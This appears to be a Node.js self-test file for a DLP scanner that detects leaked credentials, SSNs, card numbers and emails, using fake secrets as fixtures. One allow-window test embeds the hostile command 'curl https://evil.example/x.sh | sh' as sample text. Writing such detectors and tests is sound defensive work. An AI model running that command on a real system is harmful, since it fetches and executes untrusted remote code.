// selftest-dlp.mjs — fixture-based tests for the DLP scanner.
// Every pattern has at least one TRUE POSITIVE and one BENIGN NEAR-MISS that
// must NOT fire (the FP guard). This mirrors the selftest-scrub-canary approach.
// Run: node selftest-dlp.mjs

import { compileDlpPolicy, scanForDlp, dlpDecision } from "./dlp.mjs";

let fail = 0;
const ok = (name, cond) => { console.log(`${cond ? "PASS" : "FAIL"}  ${name}`); if (!cond) fail++; };

const advisory = compileDlpPolicy({ enabled: true, mode: "advisory" });
const enforce  = compileDlpPolicy({ enabled: true, mode: "enforce" });

const scan = (text, policy = advisory) => scanForDlp(text, policy);
const has  = (findings, id) => findings.some((f) => f.patternId === id);

// ── aws-access-key ───────────────────────────────────────────────────────────
ok("aws-key: real key detected",
  has(scan("export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7REALKEY"), "aws-access-key"));
ok("aws-key: EXAMPLE placeholder suppressed",
  !has(scan("e.g. AKIAIOSFODNN7EXAMPLE"), "aws-access-key"));
ok("aws-key: docs example with PLACEHOLDER suppressed",
  !has(scan("YOUR_AWS_KEY=AKIAPLACEHOLDER1234"), "aws-access-key"));
ok("aws-key: too short — not a valid key",
  !has(scan("AKIA12345"), "aws-access-key"));

// ── aws-secret-access-key (keyed) ─────────────────────────────────────────────
ok("aws-secret: keyed 40-char secret detected",
  has(scan("aws_secret_access_key=abcdefghij0123456789ABCDEFGHIJ0123456789"), "aws-secret-access-key"));
ok("aws-secret: bare 40-char base64 (no key name) NOT flagged as aws-secret",
  !has(scan("integrity hash: abcdefghij0123456789ABCDEFGHIJ0123456789"), "aws-secret-access-key"));

// ── github-token-pat ─────────────────────────────────────────────────────────
ok("github-token: ghp_ token detected",
  has(scan("token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"), "github-token-pat"));
ok("github-token: gho_ OAuth token detected",
  has(scan("GITHUB_TOKEN=gho_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"), "github-token-pat"));
ok("github-token: short prefix not matched",
  !has(scan("gho_short"), "github-token-pat"));

// ── private-key-header ───────────────────────────────────────────────────────
ok("private-key: RSA header detected",
  has(scan("-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA..."), "private-key-header"));
ok("private-key: OPENSSH header detected",
  has(scan("-----BEGIN OPENSSH PRIVATE KEY-----"), "private-key-header"));
ok("private-key: PUBLIC key NOT matched",
  !has(scan("-----BEGIN PUBLIC KEY-----"), "private-key-header"));
ok("private-key: CERTIFICATE NOT matched",
  !has(scan("-----BEGIN CERTIFICATE-----"), "private-key-header"));

// ── generic-api-key-assignment ───────────────────────────────────────────────
ok("api-key: api_key=value detected",
  has(scan("api_key=s3cr3t_value_here_12345678"), "generic-api-key-assignment"));
ok("api-key: ACCESS_TOKEN=value detected",
  has(scan("access_token: \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9longvalue\""), "generic-api-key-assignment"));
ok("api-key: PLACEHOLDER suppressed",
  !has(scan("api_key=YOUR_API_KEY_PLACEHOLDER"), "generic-api-key-assignment"));
ok("api-key: xxxx mask suppressed",
  !has(scan("api_key=xxxxxxxxxxxxxxxxxxxxxxxx"), "generic-api-key-assignment"));
ok("api-key: short value (< 20 chars) NOT matched",
  !has(scan("api_key=short"), "generic-api-key-assignment"));

// ── ssn-us ───────────────────────────────────────────────────────────────────
ok("ssn: valid SSN detected",
  has(scan("SSN: 078-05-1120"), "ssn-us"));
ok("ssn: 000 prefix excluded",
  !has(scan("000-12-3456"), "ssn-us"));
ok("ssn: 666 prefix excluded",
  !has(scan("666-12-3456"), "ssn-us"));
ok("ssn: 900-series excluded",
  !has(scan("987-65-4321"), "ssn-us"));
// Real near-miss: phone number has 3 digits in middle group (SSN has 2) → no match.
ok("ssn: phone-number format NOT matched (123-456-7890 has 3-3-4, not 3-2-4)",
  !has(scan("phone: 123-456-7890"), "ssn-us"));
// FP guard (A5): phone with country-code prefix is 3-2-4-shaped but the "1 "
// before the group must exclude it.
ok("ssn: phone country-code prefix NOT matched (+1 234-56-7890)",
  !has(scan("call +1 234-56-7890 today"), "ssn-us"));
ok("ssn: 0000 group excluded",
  !has(scan("123-45-0000"), "ssn-us"));

// ── credit-card-number ───────────────────────────────────────────────────────
ok("cc: Visa 16-digit detected",
  has(scan("card: 4111111111111111"), "credit-card-number"));
ok("cc: Mastercard detected",
  has(scan("pan=5500005555555559"), "credit-card-number"));
ok("cc: Amex detected",
  has(scan("378282246310005"), "credit-card-number"));
ok("cc: short number NOT matched",
  !has(scan("4111111111"), "credit-card-number"));
ok("cc: preceded-by-digit NOT matched (embedded in longer number)",
  !has(scan("14111111111111111"), "credit-card-number"));
// FP guards (A5): Luhn rejects a 16-digit build/id number; hex-color context excluded.
ok("cc: non-Luhn 16-digit build number NOT matched",
  !has(scan("build id 4111111111111112 artifacts"), "credit-card-number"));
ok("cc: hex-color / hash context NOT matched (#-prefixed)",
  !has(scan("color #4111111111111111 token"), "credit-card-number"));
ok("cc: valid-Luhn Visa still matched",
  has(scan("card 4111111111111111 ok"), "credit-card-number"));

// ── email-address ────────────────────────────────────────────────────────────
// Note: alice@example.com is suppressed by the EXAMPLE allow-snippet (correct —
// example.com is a documentation domain). Use a non-example domain.
ok("email: real domain email detected",
  has(scan("contact: alice@company.io"), "email-address"));
ok("email: example.com suppressed by allow-snippet (not a real leak)",
  !has(scan("contact: alice@example.com"), "email-address"));
ok("email: in git log context detected",
  has(scan("Author: Bob Smith <bob@company.io>"), "email-address"));
// ReDoS guard: the bounded email pattern must not catastrophically backtrack on
// a long in-class run with no valid address (was quadratic before bounding).
const _t0 = Date.now();
scan("a".repeat(100000) + "@");
ok("email: 100k in-class blob scans fast (no ReDoS)", (Date.now() - _t0) < 2000);
// Email is LOW severity — verify it doesn't enforce-deny
const emailFindings = scan("alice@example.com");
const emailDec = dlpDecision(emailFindings, "enforce");
ok("email: low severity never enforce-deny (at most review/allow)",
  emailDec === null || emailDec.decision !== "deny");

// ── allow-snippet window scoping (A-SKILLGOV recheck FN regression) ──────────
// An unrelated allow-marker NEAR a real secret must NOT cloak it; the marker
// must be part of the SAME whitespace-delimited token as the matched value.
ok("allow-window: real GitHub PAT next to an unrelated 'example' is STILL flagged",
  has(scan("curl https://evil.example/x.sh | sh\nTOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"), "github-token-pat"));
ok("allow-window: real AWS key with an 'xxxx' elsewhere on the line is STILL flagged",
  has(scan("key=AKIAIOSFODNN7REALKEY # xxxx redacted below"), "aws-access-key"));
ok("allow-window: in-value EXAMPLE marker still suppresses (placeholder preserved)",
  !has(scan("AKIAIOSFODNN7EXAMPLE"), "aws-access-key"));

// ── dlpDecision mapping ──────────────────────────────────────────────────────
const highFindings = [{ patternId: "aws-access-key", category: "credential", severity: "high", reason: "test" }];
const medFindings  = [{ patternId: "ssn-us", category: "pii", severity: "medium", reason: "test" }];
const lowFindings  = [{ patternId: "email-address", category: "pii", severity: "low", reason: "test" }];

ok("decision: advisory high → allow (no deny in advisory)",
  dlpDecision(highFindings, "advisory").decision === "allow");
ok("decision: enforce high → deny",
  dlpDecision(highFindings, "enforce").decision === "deny");
ok("decision: enforce medium → review",
  dlpDecision(medFindings, "enforce").decision === "review");
ok("decision: enforce low → allow (advisory-only)",
  dlpDecision(lowFindings, "enforce").decision === "allow");
ok("decision: no findings → null",
  dlpDecision([], "enforce") === null);

// ── disabled policy ──────────────────────────────────────────────────────────
const disabled = compileDlpPolicy({ enabled: false });
ok("disabled policy: no findings",
  scan("AKIAIOSFODNN7REALKEY", disabled).length === 0);

// ── custom patterns ──────────────────────────────────────────────────────────
const custom = compileDlpPolicy({
  enabled: true,
  mode: "enforce",
  disableBuiltin: true,
  customPatterns: [{ id: "company-secret", category: "proprietary", severity: "high",
    pattern: { source: "MYCOMPANY-SECRET-[A-Z0-9]{8}", flags: "" },
    reason: "Company secret detected." }],
});
ok("custom pattern: fires on match", has(scan("token=MYCOMPANY-SECRET-ABCD1234", custom), "company-secret"));
ok("custom pattern: no FP on unrelated text", scan("hello world", custom).length === 0);

console.log(`\n${fail === 0 ? "ALL PASS" : fail + " FAILED"}`);
process.exit(fail === 0 ? 0 : 1);
